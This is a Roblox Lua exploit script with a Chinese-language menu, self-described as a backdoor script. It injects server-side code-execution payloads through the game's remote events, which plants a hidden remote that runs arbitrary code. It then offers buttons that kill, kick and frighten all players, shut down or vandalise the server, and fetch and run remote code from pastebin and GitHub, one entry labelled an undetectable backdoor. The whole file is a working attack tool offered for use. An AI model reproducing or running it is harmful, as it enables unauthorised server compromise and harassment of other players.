-- 加载WindUI库
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- 初始化游戏服务
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()

-- 确保角色存在
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

-- 初始化游戏对象
local rooms = Workspace:FindFirstChild("Rooms") or Workspace
local ores = Workspace:FindFirstChild("Ores") or Workspace
local mobs = Workspace:FindFirstChild("Mobs") or Workspace
local invOres = LocalPlayer:FindFirstChild("InventoryOres") or LocalPlayer

-- 通知消息
WindUI:Notify({
    Title = "已自动反作弊",
    Content = "启用成功",
    Duration = 5,
})

WindUI:Notify({
    Title = "欢迎尊贵的1.用户",
    Content = "欢迎",
    Duration = 5,
})

WindUI:Notify({
    Title = "脚本永久免费 请勿倒卖 如有问题 询问QQ",
    Content = "公告",
    Duration = 5,
})

WindUI:Notify({
    Title = "1.HUBKM--黑客 貌似后门脚本--",
    Content = "已启动",
    Duration = 5,
})

-- 创建主窗口
local Window = WindUI:CreateWindow({
    Title = "1.HUBKM 后门脚本",
    Icon = "rbxassetid://4483362748",
    IconThemed = true,
    Author = "后门脚本",
    Folder = "CloudHub",
    Size = UDim2.fromOffset(350, 420),
    Transparent = true,
    Theme = "Dark",
    User = {
        Enabled = true,
        Callback = function() print("点击了用户按钮") end,
        Anonymous = false
    },
    SideBarWidth = 200,
    ScrollBarEnabled = true,
})

-- 主功能区
local MainSection = Window:Section({
    Title = "功能列表",
    Opened = true,
})

-- 技能功能标签
local SkillsTab = MainSection:Tab({ Title = "所有我的后门功能_其他脚本", Icon = "Sword" })

-- 后门扫描功能
local function ScanBackdoor()
    local function b_G_V12(see)
        local a = function(ree)
            ree:FireServer([[
            local folder = Instance.new('RemoteEvent')
            folder.Name = "_FEBYPASS32"
            folder.Parent = game:GetService("JointsService")
            local loadstring = require(13684410229)
            folder.OnServerEvent:Connect(function(_1,_2)
            loadstring(_2)()
            end)
            ]])
        end
        for i, v in pairs(see:GetChildren()) do
            if v:IsA("RemoteEvent") then
                if not string.match(string.lower(v.Name), "ban") then
                    if not string.match(string.lower(v.Name), "kick") then
                        a(v)
                    end
                end
            end
            b_G_V12(v)
        end
    end
    local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
    local timetoken = 0
    local maxtime = 1
    repeat 
        wait(0.1) 
        timetoken = timetoken + 0.1
    until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
    return game:GetService("JointsService"):FindFirstChild("_FEBYPASS32")
end

-- 执行后门命令
local function ExecuteCommand(command)
    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
        game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(command))
        return true
    end
    return false
end

-- 功能列表
local Functions = {
    ["控制所有玩家进行旋转"] = function()
        for _,plr in ipairs(game.Players:GetPlayers()) do 
            if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then 
                local gyro=Instance.new('BodyGyro') 
                gyro.MaxTorque=Vector3.new(0,math.huge,0) 
                gyro.P=10000 
                gyro.CFrame=plr.Character.HumanoidRootPart.CFrame 
                gyro.Parent=plr.Character.HumanoidRootPart 
                spawn(function() 
                    while gyro.Parent and plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid.Health>0 do 
                        gyro.CFrame=gyro.CFrame*CFrame.Angles(0,math.rad(10),0) 
                        wait(0.001) 
                    end 
                end) 
            end 
        end
    end,
    
    ["对所有玩家轰炸牌子"] = function()
        for _,v in pairs(game.Players:GetPlayers()) do 
            if v.Character and v.Character:FindFirstChild('Head') then 
                local gui1=Instance.new('BillboardGui') 
                gui1.Parent = v.Character.Head 
                gui1.Adornee = v.Character.Head 
                gui1.Size = UDim2.new(2.5, 0, 2.5, 0) 
                gui1.StudsOffset = Vector3.new(0, 0.2, 0) 
                gui1.AlwaysOnTop = true 
                local img = Instance.new('ImageLabel') 
                img.Image = 'http://www.roblox.com/asset/?id=120840481247911' 
                img.Size = UDim2.new(1, 0, 1, 0) 
                img.Position = UDim2.new(0, 0, 0, 0) 
                img.BackgroundTransparency = 1 
                img.Parent = gui1 
                v.Character.Head.Transparency = 1 
            end 
        end
    end,
    
    ["生成大量新手"] = function()
        local Players = game:GetService('Players') 
        local username = 'CinnabarMothMan' 
        local success, userId = pcall(function() 
            return Players:GetUserIdFromNameAsync(username) 
        end) 
        if not success then 
            warn('找不到用户:', username) 
            return 
        end 
        local npc = Players:CreateHumanoidModelFromUserId(userId) 
        npc.Name = '新手 by gojohdkaisenkt' 
        npc.Parent = workspace 
        local hrp = npc:WaitForChild('HumanoidRootPart', 5) 
        if not hrp then 
            warn('NPC模型中找不到HumanoidRootPart.') 
            return 
        end 
        local targetPlayer = Players:GetPlayers()[1] 
        if not targetPlayer or not targetPlayer.Character then 
            warn('找不到玩家或角色.') 
            return 
        end 
        local playerHRP = targetPlayer.Character:FindFirstChild('HumanoidRootPart') 
        if not playerHRP then 
            warn('找不到玩家的HumanoidRootPart.') 
            return 
        end 
        npc:SetPrimaryPartCFrame(playerHRP.CFrame * CFrame.new(0, 0, -5))
    end,
    
    ["循环杀死所有玩家"] = function()
        while true do
            for _, p in pairs(game.Players:GetPlayers()) do
                if p ~= game.Players.LocalPlayer and p.Character and p.Character:FindFirstChild("Humanoid") then
                    p.Character.Humanoid.Health = 0
                end
            end
            task.wait(0.1)
        end
    end,
    
    ["对所有玩家进行爆炸"] = function()
        while true do
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    local e = Instance.new("Explosion")
                    e.Position = v.Position
                    e.BlastRadius = 10
                    e.BlastPressure = 500000
                    e.Parent = workspace
                end
            end
            task.wait(0.5)
        end
    end,
    
    ["所有玩家燃烧"] = function()
        for _,v in pairs(workspace:GetDescendants()) do 
            if v:IsA('BasePart') then 
                Instance.new('Fire',v) 
            end 
        end
    end,
    
    ["关闭整个服务器"] = function()
        for _,p in pairs(game.Players:GetPlayers()) do 
            if p:FindFirstChildOfClass('PlayerGui') then 
                local g=Instance.new('ScreenGui',p:FindFirstChildOfClass('PlayerGui')) 
                g.Name='关闭GUI' 
                g.ResetOnSpawn=false 
                local f=Instance.new('Frame',g) 
                f.Size=UDim2.new(1,0,1,0) 
                f.BackgroundColor3=Color3.new(0,0,0) 
                f.BackgroundTransparency=0.5 
                Instance.new('UICorner',f).CornerRadius=UDim.new(0,10) 
                local i=Instance.new('ImageLabel',f) 
                i.Size=UDim2.new(0,150,0,150) 
                i.Position=UDim2.new(0.5,0,0.4,0) 
                i.AnchorPoint=Vector2.new(0.5,0.5) 
                i.BackgroundTransparency=1 
                i.Image='rbxassetid://123145425569096' 
                Instance.new('UICorner',i).CornerRadius=UDim.new(1,0) 
                local t=Instance.new('TextLabel',f) 
                t.Size=UDim2.new(1,0,0,50) 
                t.Position=UDim2.new(0,0,0.7,0) 
                t.BackgroundTransparency=1 
                t.Text='' 
                t.TextColor3=Color3.new(1,0,0) 
                t.TextStrokeTransparency=0.5 
                t.TextScaled=true 
                local s=Instance.new('Sound',g) 
                s.SoundId='rbxassetid://9118823104' 
                s.Volume=5 
                s:Play() 
                local msg='1.hubkm正在关闭服务器...' 
                for i=1,#msg do 
                    t.Text=string.sub(msg,1,i) 
                    wait(0.05) 
                end 
            end 
        end 
        wait(2) 
        for _,p in pairs(game.Players:GetPlayers()) do 
            p:Kick('1.HUMM关闭') 
        end
    end,
    
    ["踢出所有玩家"] = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local reason = "你已被1.HUBKM踢出 原因_没有"
        
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                player:Kick("被1.HUBKM踢出 | 原因:没有 " .. reason .. " | 1.HUBKM ZXNBYYDSKZM")
            end
        end
    end,
    
    ["服务器消息语"] = function()
        local m=Instance.new('Message') 
        m.Parent=workspace 
        m.Text='服务器已被1.HUBKM破坏🤣🤣🤣' 
        wait(5) 
        m:Destroy()
    end,
    
    ["提醒语"] = function()
        local h=Instance.new('Hint') 
        h.Parent=workspace 
        h.Text='1.HUBKM 提醒你 快点退出服务器' 
        wait(5) 
        h:Destroy()
    end,
    
    ["Polaria_不知道搬运"] = function()
        require(123255432303221):Pload(game.Players.LocalPlayer.Name)
    end,
    
    ["管理员权限"] = function()
        require(7192763922).load(game.Players.LocalPlayer.Name)
    end,
    
    ["反抄袭_搬运未知"] = function()
        require(10304477576).AntiSkid(game.Players.LocalPlayer.Name)
    end,
    
    ["删除所有建筑"] = function()
        for _,v in ipairs(workspace:GetChildren()) do 
            if v:IsA('Model') or v:IsA('Part') or v:IsA('UnionOperation') then 
                v:Destroy() 
            end 
        end
    end,
    
    ["轰炸"] = function()
        local p=game.Players:GetPlayers()[1] 
        if not p or not p.Character or not p.Character:FindFirstChild('HumanoidRootPart') then 
            return 
        end 
        local root=p.Character.HumanoidRootPart 
        local pos=root.Position 
        local dir=root.CFrame.LookVector 
        local plane=Instance.new('Part',workspace) 
        plane.Size=Vector3.new(10,3,10) 
        plane.Anchored=true 
        plane.CanCollide=false 
        plane.CFrame=CFrame.new(pos+Vector3.new(0,60,0)+dir*100,pos+Vector3.new(0,60,0)) 
        plane.Name='轰炸机' 
        local mesh=Instance.new('SpecialMesh',plane) 
        mesh.MeshType=Enum.MeshType.FileMesh 
        mesh.MeshId='rbxassetid://14696124294' 
        mesh.Scale=Vector3.new(2,2,2) 
        spawn(function() 
            for i=1,500 do 
                plane.CFrame=plane.CFrame*CFrame.new(0,0,-2) 
                wait(0.01) 
            end 
            plane:Destroy() 
        end) 
        for i=1,100 do 
            local bomb=Instance.new('Part',workspace) 
            bomb.Size=Vector3.new(2,2,2) 
            bomb.Position=plane.Position-Vector3.new(0,2,0) 
            bomb.Anchored=false 
            bomb.CanCollide=true 
            bomb.Name='炸弹' 
            local m=Instance.new('SpecialMesh',bomb) 
            m.MeshId='rbxassetid://15649100930' 
            m.Scale=Vector3.new(1.5,1.5,1.5) 
            local s=Instance.new('Sound',bomb) 
            s.SoundId='rbxassetid://136749653197645' 
            s.Volume=2 
            s:Play() 
            local hint=Instance.new('Hint',workspace) 
            hint.Text='luau X SS: 轰炸机来了'
            game:GetService('Debris'):AddItem(hint,1.5) 
            spawn(function() 
                wait(2+math.random()) 
                if bomb and bomb.Parent then 
                    local e=Instance.new('Explosion',workspace) 
                    e.Position=bomb.Position 
                    e.BlastRadius=10 
                    e.BlastPressure=0 
                    e.Parent=workspace 
                    for _,v in ipairs(workspace:GetDescendants()) do 
                        if v:IsA('BasePart') and (v.Position - bomb.Position).Magnitude < 15 then 
                            if v.Name~='Baseplate' then 
                                v.Anchored=false 
                                v.BrickColor=BrickColor.new('Really black') 
                                if not v:FindFirstChild('Fire') then 
                                    local f=Instance.new('Fire',v) 
                                    f.Heat=10 
                                    f.Size=6 
                                end 
                                v.Touched:Connect(function(hit) 
                                    local h=hit.Parent and hit.Parent:FindFirstChildOfClass('Humanoid') 
                                    if h then 
                                        h.Health=0 
                                    end 
                                end) 
                            end 
                        end 
                    end 
                    bomb:Destroy() 
                end 
            end) 
            wait(0.2) 
        end
    end,
    
    ["音乐"] = function()
        local s=Instance.new('Sound', workspace) 
        s.Name='1.HUBKM' 
        s.SoundId='rbxassetid://1839246711' 
        s.Volume=999 
        s.Looped=true 
        s:Play()
    end,
    
    ["危险_介意不要开启"] = function()
        require(140321069022189).pingas(game.Players.LocalPlayer.Name)
    end,
    
    ["ac6"] = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
    end,
    
    ["天空盒"] = function()
        local l=game:GetService('Lighting') 
        l:ClearAllChildren() 
        local s=Instance.new('Sky') 
        s.SkyboxBk='rbxassetid://120840481247911' 
        s.SkyboxDn='rbxassetid://120840481247911' 
        s.SkyboxFt='rbxassetid://120840481247911' 
        s.SkyboxLf='rbxassetid://120840481247911' 
        s.SkyboxRt='rbxassetid://120840481247911' 
        s.SkyboxUp='rbxassetid://120840481247911' 
        s.Parent=l
    end,
    
    ["贴图刷屏"] = function()
        local function applyDecals(obj) 
            for _,v in ipairs(obj:GetDescendants()) do 
                if v:IsA('Decal') then 
                    v:Destroy() 
                elseif v:IsA('BasePart') then 
                    v.Material='Plastic' 
                    v.Transparency=0 
                    for _,face in ipairs(Enum.NormalId:GetEnumItems()) do 
                        local d=Instance.new('Decal') 
                        d.Texture='http://www.roblox.com/asset/?id=120840481247911' 
                        d.Face=face 
                        d.Parent=v 
                    end 
                end 
            end 
        end 
        applyDecals(workspace)
    end,
    
    ["惊吓_外网搬运"] = function()
        for _,p in pairs(game.Players:GetPlayers()) do 
            local gui=Instance.new('ScreenGui') 
            gui.Name='1.HUBKM惊吓' 
            gui.ResetOnSpawn=false 
            gui.Parent=p:FindFirstChildOfClass('PlayerGui') 
            local img=Instance.new('ImageLabel') 
            img.Size=UDim2.new(1,0,1,0) 
            img.Position=UDim2.new(0,0,0,0) 
            img.BackgroundTransparency=1 
            img.Image='rbxassetid://120840481247911' 
            img.ImageTransparency=1 
            img.Parent=gui 
            local sound=Instance.new('Sound') 
            sound.SoundId='rbxassetid://6129291390' 
            sound.Volume=5 
            sound.Parent=gui 
            sound:Play() 
            game:GetService('TweenService'):Create(img,TweenInfo.new(0.2),{ImageTransparency=0}):Play() 
            spawn(function() 
                for j=1,100 do 
                    if img and img.Parent then 
                        img.Position=UDim2.new(0,math.random(-10,10),0,math.random(-10,10)) 
                        wait(0.01) 
                    end 
                end 
                img.Position=UDim2.new(0,0,0,0) 
            end) 
            delay(6,function() 
                if img and img.Parent then 
                    game:GetService('TweenService'):Create(img,TweenInfo.new(0.3),{ImageTransparency=1}):Play() 
                end 
                wait(2) 
                if gui and gui.Parent then 
                    gui:Destroy() 
                end 
            end) 
        end
    end,
    
    ["天空盒_其他作者"] = function()
        local l=game:GetService('Lighting') 
        l:ClearAllChildren() 
        local s=Instance.new('Sky') 
        s.SkyboxBk='rbxassetid://139086681736602' 
        s.SkyboxDn='rbxassetid://139086681736602' 
        s.SkyboxFt='rbxassetid://139086681736602' 
        s.SkyboxLf='rbxassetid://139086681736602' 
        s.SkyboxRt='rbxassetid://139086681736602' 
        s.SkyboxUp='rbxassetid://139086681736602' 
        s.Parent=l
    end,
    
    ["贴图刷屏_其他作者"] = function()
        local function applyDecals(obj) 
            for _,v in ipairs(obj:GetDescendants()) do 
                if v:IsA('Decal') then 
                    v:Destroy() 
                elseif v:IsA('BasePart') then 
                    v.Material='Plastic' 
                    v.Transparency=0 
                    for _,face in ipairs(Enum.NormalId:GetEnumItems()) do 
                        local d=Instance.new('Decal') 
                        d.Texture='http://www.roblox.com/asset/?id=139086681736602' 
                        d.Face=face 
                        d.Parent=v 
                    end 
                end 
            end 
        end 
        applyDecals(workspace)
    end,

    ["骨头_😰"] = function()
        local containers = {
            game:GetService("ReplicatedStorage"),
            game:GetService("Workspace"),
            game:GetService("Players"),
            game:GetService("Lighting"),
            game:GetService("StarterPack"),
            game:GetService("StarterGui"),
            game:GetService("StarterPlayer"),
            game:GetService("Teams"),
            game:GetService("SoundService"),
        }
        local payload = [[
        local imageOne = "http://www.roblox.com/asset/?id=169585459"
        local imageTwo = "http://www.roblox.com/asset/?id=169585475"
        local imageThree = "http://www.roblox.com/asset/?id=169585485"
        local imageFour = "http://www.roblox.com/asset/?id=169585502"
        local imageFive = "http://www.roblox.com/asset/?id=169585515"
        local imageSix = "http://www.roblox.com/asset/?id=169585502"
        local imageSeven = "http://www.roblox.com/asset/?id=169585485"
        local imageEight = "http://www.roblox.com/asset/?id=169585475"
        for i = 1, 1000 do
            local Spooky = Instance.new("Sound")
            Spooky.Name = "Spooky" .. i
            Spooky.SoundId = "rbxassetid://104181508980428"
            Spooky.Volume = 10
            Spooky.Looped = true
            Spooky.Pitch = 0.2
            Spooky.Parent = workspace
            Spooky:Play()
        end
        local Spooky = Instance.new("Sound", workspace)
        Spooky.Name = "Spooky"
        Spooky.SoundId = "rbxassetid://174270407"
        Spooky.Volume = 15
        Spooky.Looped = true
        Spooky:Play()
        local Sky = Instance.new("Sky", game.Lighting)
        Sky.SkyboxBk = imageOne
        Sky.SkyboxDn = imageOne
        Sky.SkyboxFt = imageOne
        Sky.SkyboxLf = imageOne
        Sky.SkyboxRt = imageOne
        Sky.SkyboxUp = imageOne
        while true do
            Sky.SkyboxBk = imageOne
            Sky.SkyboxDn = imageOne
            Sky.SkyboxFt = imageOne
            Sky.SkyboxLf = imageOne
            Sky.SkyboxRt = imageOne
            Sky.SkyboxUp = imageOne
            wait(0.15)
            Sky.SkyboxBk = imageTwo
            Sky.SkyboxDn = imageTwo
            Sky.SkyboxFt = imageTwo
            Sky.SkyboxLf = imageTwo
            Sky.SkyboxRt = imageTwo
            Sky.SkyboxUp = imageTwo
            wait(0.15)
            Sky.SkyboxBk = imageThree
            Sky.SkyboxDn = imageThree
            Sky.SkyboxFt = imageThree
            Sky.SkyboxLf = imageThree
            Sky.SkyboxRt = imageThree
            Sky.SkyboxUp = imageThree
            wait(0.15)
            Sky.SkyboxBk = imageFour
            Sky.SkyboxDn = imageFour
            Sky.SkyboxFt = imageFour
            Sky.SkyboxLf = imageFour
            Sky.SkyboxRt = imageFour
            Sky.SkyboxUp = imageFour
            wait(0.15)
            Sky.SkyboxBk = imageFive
            Sky.SkyboxDn = imageFive
            Sky.SkyboxFt = imageFive
            Sky.SkyboxLf = imageFive
            Sky.SkyboxRt = imageFive
            Sky.SkyboxUp = imageFive
            wait(0.15)
            Sky.SkyboxBk = imageSix
            Sky.SkyboxDn = imageSix
            Sky.SkyboxFt = imageSix
            Sky.SkyboxLf = imageSix
            Sky.SkyboxRt = imageSix
            Sky.SkyboxUp = imageSix
            wait(0.15)
            Sky.SkyboxBk = imageSeven
            Sky.SkyboxDn = imageSeven
            Sky.SkyboxFt = imageSeven
            Sky.SkyboxLf = imageSeven
            Sky.SkyboxRt = imageSeven
            Sky.SkyboxUp = imageSeven
            wait(0.15)
            Sky.SkyboxBk = imageEight
            Sky.SkyboxDn = imageEight
            Sky.SkyboxFt = imageEight
            Sky.SkyboxLf = imageEight
            Sky.SkyboxRt = imageEight
            Sky.SkyboxUp = imageEight
            wait(0.15)
        end
        ]]

        local function getAllRemotes(container)
            local remotes = {}
            for _, v in ipairs(container:GetDescendants()) do
                if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                    table.insert(remotes, v)
                end
            end
            return remotes
        end

        local allRemotes = {}
        for _, container in ipairs(containers) do
            for _, remote in ipairs(getAllRemotes(container)) do
                table.insert(allRemotes, remote)
            end
        end

        for _, remote in ipairs(allRemotes) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(payload)
                end)
            elseif remote:IsA("RemoteFunction") then
                pcall(function()
                    remote:InvokeServer(payload)
                end)
            end
        end
    end,
    
    ["音响最大🤓"] = function()
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://1839246711"
        s.Volume = 100
        s.Looped = true
        s:Play()
        game:GetService("Debris"):AddItem(s, 6000)
    end,
    
    ["贴图刷屏_绿鬼"] = function()
        local function applyDecals(obj) 
            for _,v in ipairs(obj:GetDescendants()) do 
                if v:IsA('Decal') then 
                    v:Destroy() 
                elseif v:IsA('BasePart') then 
                    v.Material='Plastic' 
                    v.Transparency=0 
                    for _,face in ipairs(Enum.NormalId:GetEnumItems()) do 
                        local d=Instance.new('Decal') 
                        d.Texture='http://www.roblox.com/asset/?id=17331294149' 
                        d.Face=face 
                        d.Parent=v 
                    end 
                end 
            end 
        end 
        applyDecals(workspace)
    end,
    
    ["恐怖_杰夫"] = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/moedlol/idkidk/refs/heads/main/toilet"))()
    end,

    ["其他后门_无法检测的后门链接https://pastebin.com/raw/LCu92ciY"] = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/LCu92ciY"))()
    end,

    ["火焰"] = function()
        -- 给所有物体添加火焰效果
        function FireParts()
            for i,v in pairs(game.Workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    Instance.new("Fire", v)
                end
            end
        end
        FireParts()
    end,

    ["彩色迷雾"] = function()
        -- 创建循环变化的彩色雾效
        local colors = {
            Color3.fromRGB(0, 255, 0), -- 酸橙色
            Color3.fromRGB(255, 0, 0), -- 红色
            Color3.fromRGB(0, 0, 255), -- 蓝色
            Color3.fromRGB(255, 255, 0), -- 黄色
            Color3.fromRGB(255, 0, 255), -- 紫色
        }
        
        while true do
            for _, color in ipairs(colors) do
                game.Lighting.FogColor = color
                wait(1)
            end
        end
    end,
    
    ["闪烁天空盒"] = function()
        -- 创建闪烁变化的天空盒
        local images = {
            "http://www.roblox.com/asset/?id=139086681736602",
            "http://www.roblox.com/asset/?id=120840481247911"
        }
        local index = 1
        
        -- 定时切换天空贴图
        while true do
            local sky = game.Lighting:FindFirstChildOfClass("Sky")
            if not sky then
                sky = Instance.new("Sky", game.Lighting)
            end
            
            sky.SkyboxBk = images[index]
            sky.SkyboxDn = images[index]
            sky.SkyboxFt = images[index]
            sky.SkyboxLf = images[index]
            sky.SkyboxRt = images[index]
            sky.SkyboxUp = images[index]
            
            index = index % #images + 1
            wait(0.5)
        end
    end,

    ["所有物体装饰星光"] = function()
        -- 给所有物体添加星光效果
        function AddSparkles()
            for i,v in pairs(game.Workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    Instance.new("Sparkles", v)
                end
            end
        end
        AddSparkles()
    end,

    ["杀死所有玩家头"] = function()
        -- 销毁所有玩家的头部
        function KillAll()
            for i,v in pairs(game.Players:GetPlayers()) do
                if v.Character and v.Character:FindFirstChild("Head") then
                    v.Character.Head:Destroy()
                end
            end
        end
        KillAll()
    end,

    ["未知音乐高"] = function()
        local s = Instance.new("Sound", workspace)
        s.SoundId = "rbxassetid://83080737598138"
        s.Volume = 10
        s.Pitch = 9.22
        s.Looped = true
        s:Play()
    end
}

-- 扫描后门
local backdoorFound = ScanBackdoor()
if backdoorFound then
    WindUI:Notify({
        Title = "后门扫描",
        Content = "后门扫描成功，可以使用功能",
        Duration = 5,
    })
else
    WindUI:Notify({
        Title = "后门扫描",
        Content = "未找到后门，部分功能可能无法使用",
        Duration = 5,
    })
end

-- 创建功能按钮
for funcName, func in pairs(Functions) do
    SkillsTab:Button({
        Title = funcName,
        Callback = function()
            WindUI:Notify({
                Title = "执行功能",
                Content = "正在执行: " .. funcName,
                Duration = 3,
            })
            pcall(func)  -- 安全执行函数
        end,
    })
end

-- 添加一个警告标签
SkillsTab:Label({
    Title = "警告",
    Content = "部分功能可能对服务器造成严重影响，请谨慎使用",
    Center = true,
    Color = Color3.fromRGB(255, 0, 0),
})

-- 添加一个分割线
SkillsTab:Divider()
